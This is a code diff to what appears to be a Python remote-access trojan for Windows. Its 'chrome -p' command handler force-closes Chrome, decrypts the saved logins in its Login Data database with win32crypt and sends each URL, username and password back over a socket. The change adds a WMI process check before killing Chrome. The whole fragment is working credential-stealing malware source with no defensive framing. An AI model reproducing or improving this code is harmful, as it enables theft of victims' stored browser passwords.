@@ -15,6 +15,7 @@ from psutil import virtual_memory
 import tkinter as tk
 import sqlite3
 import win32crypt
+from win32com.client import GetObject
 
 GREEN = '\33[32m'
 RED = '\33[31m'
@@ -123,11 +124,16 @@ def recieveCommands():
                 s.send(str.encode(error))
         elif data[:].decode("utf-8") == 'chrome -p':
             try:
+                WMI = GetObject('winmgmts:')
+                processes = WMI.InstancesOf('Win32_Process')
                 chromePath = r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
 
                 def close_chrome():
                     try:
-                        os.system("TASKKILL /F /IM chrome.exe")
+                        if "chrome.exe" in [process.Properties_('Name').Value for process in processes]:
+                            os.system("TASKKILL /F /IM chrome.exe")
+                        else:
+                            pass
                     except:
                         pass
 
@@ -149,8 +155,8 @@ def recieveCommands():
                         string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
                         s.send(str.encode(string))
 
-                close_chrome()
-                get_chrome()
+                    close_chrome()
+                    get_chrome()
 
             except:
                 error = '\n' + RED + BOLD + '[!] There was an error getting saved chrome passwords' + END + '\n'
